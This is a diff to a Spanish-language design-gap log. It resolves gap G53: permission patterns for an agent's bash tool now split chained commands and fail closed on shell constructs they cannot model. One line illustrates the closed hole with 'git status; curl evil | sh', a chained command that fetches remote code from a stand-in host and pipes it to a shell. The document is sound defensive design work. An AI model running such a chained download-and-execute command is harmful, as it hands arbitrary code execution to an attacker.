@@ -9,12 +9,14 @@ resolución se aplica a los documentos afectados y la entrada pasa a
 aquello es lo que decidimos no decidir; esto son agujeros que la v1 sí
 necesita cerrados.
 
-**Estado: 52 registradas, 48 resueltas, 4 abiertas** (G53–G56 añadidas
+**Estado: 52 registradas, 49 resueltas, 3 abiertas** (G53–G56 añadidas
 2026-07-16 desde la auditoría de seguridad
 ([auditoria-seguridad-2026-07-16.md](audits/auditoria-seguridad-2026-07-16.md)):
 grietas de diseño de SEC-02/03/04/07 —semántica de emparejamiento de permisos,
 control de redirects en `enu.http`, scrubbing de secretos del entorno, e
-identidad de un worker para las primitivas [W]—, **abiertas** a la espera de
+identidad de un worker para las primitivas [W]—; G53 **resuelta** el mismo
+día — emparejamiento por subcomando con fail-closed, ADR-023, alternativa
+mayor pospuesta como P39 —; G54–G56 **abiertas** a la espera de
 decisión del propietario. G52 añadida
 2026-07-14 desde A-38 de la auditoría integral — `Ws:send` sin vía binaria y
 `Ws:recv` sin distinguir el tipo de frame — resuelta por adición a `api.md`
@@ -1188,7 +1190,35 @@ UTF-8 del payload (descartada: tipo de frame dependiente del contenido).
 (c) Modo por conexión en `ws.connect` (descartada: los protocolos mixtos
 existen y obligaría a dos conexiones o a un modo "raw" igual de explícito).
 
-## G53 · La semántica de emparejamiento de los patrones de permiso `tool[:argumento]` no está especificada, y en `bash` el encadenamiento la vuelve una frontera falsa — `agente.md` §5 / `chat.md` §5 / `guia-plugins.md` — **ABIERTO**
+## G53 · La semántica de emparejamiento de los patrones de permiso `tool[:argumento]` no está especificada, y en `bash` el encadenamiento la vuelve una frontera falsa — `agente.md` §5 / `chat.md` §5 / `guia-plugins.md` — **RESUELTO**
+
+**Resolución** (2026-07-16; aplicada en [agente.md](agente.md) §5 —la
+especificación—, [chat.md](chat.md) §5, [guia-plugins.md](guia-plugins.md)
+§5 y [arquitectura.md](arquitectura.md) —el ejemplo MCP pasa a allows de
+nombre exacto—; doctrina registrada en [ADR-023](adr.md); la alternativa
+mayor, pospuesta como [P39](pospuesto.md)). **Modelo Claude Code adaptado** — el matcher del
+harness de referencia, ajustado a la doctrina fail-closed del proyecto. La
+semántica de match pasa de implícita a contrato: patrón sin `:` = nombre
+exacto de la tool; `tool:arg` = glob anclado (`*` ⇒ `.*`, `^…$`, resto
+literal) sobre la representación textual del argumento principal. Para
+`bash`, el comando se **descompone por operadores** (`&&`, `||`, `;`, `|`,
+`|&`, `&`, saltos de línea) con un tokenizador que modela solo palabras
+planas y strings entre comillas: un `allow` concede **solo si cada
+subcomando** casa algún patrón (`git status; curl evil | sh` ya no entra por
+`bash:git *`), y todo constructo no modelable — `$( )`, backticks, `$VAR` en
+posición de comando, redirecciones, heredocs, subshells/llaves, comillas
+desbalanceadas — hace **fail-closed** hacia `ask` (deny en headless); la
+lista de constructos modelables es **cerrada por contrato** (doctrina P17).
+`deny` casa si **algún** subcomando casa, conserva su precedencia absoluta y
+queda documentado como best-effort (doctrina G16). El contrato añade la
+**advertencia honesta** (ningún patrón acota lo que un binario permitido
+ejecuta por dentro — hooks de git, `postinstall`—; la valla dura son los
+workers con `caps`), y la UX de "permitir siempre" persiste reglas **por
+subcomando**, no el string encadenado (P29). **Sin cambios en `api.md` ni
+bump de `enu.version.api`**: los permisos son vocabulario de producto y viven
+en la extensión — confirmado por el juez de filosofía al validar la
+propuesta. (Origen: SEC-02 de la
+[auditoría de seguridad](audits/auditoria-seguridad-2026-07-16.md).)
 
 **Problema.** Ningún documento fija el algoritmo con que un permiso `allow`/`deny`
 de la forma `tool:argumento` casa contra una petición concreta. Con emparejamiento
@@ -1204,13 +1234,15 @@ verificación adversarial doble.
 "la máquina ejecuta", no ofrece la garantía que su sintaxis sugiere. Un allow
 razonable concede ejecución arbitraria; un deny razonable no cierra lo que nombra.
 
-**Dirección (a decidir).** (a) Especificar el algoritmo de match en `api.md`/`agente.md`
-y decidir si `bash:` empareja contra el **string crudo** (glob, no-frontera → el
-contrato debe **advertir** explícitamente que un patrón de `bash` no acota lo que
-se ejecuta) o contra el **programa parseado** (primer token / árbol de comandos,
-rechazando encadenamiento salvo opt-in). (b) Tratar `bash` como caso especial con
-su propia gramática de permisos. La resolución debe propagarse a los ejemplos de
-`chat.md` §5 y a `guia-plugins.md`. (Origen: SEC-02.)
+**Opciones.** (a) Glob sobre el string crudo + advertencia de no-frontera
+(descartada: documenta la grieta en vez de cerrarla — el allowlist seguiría
+concediendo ejecución arbitraria justo en el contexto headless que §5
+presume proteger). (b) Emparejar contra el **programa parseado** con un
+parser de bash completo (pospuesta como P39: proyecto de seguridad en sí,
+primitiva de kernel con un único consumidor). (c) **Descomposición por
+operadores con tokenizador cerrado y fail-closed** (elegida: cierra el
+vector real — el encadenamiento — sin prometer un parser de bash; lo que no
+se modela cae a `ask`, no a conceder).
 
 ## G54 · `enu.http`/`enu.http.stream` siguen redirects sin control: no es expresable no-seguirlos ni observar la cadena — `api.md` §8 — **ABIERTO**
 
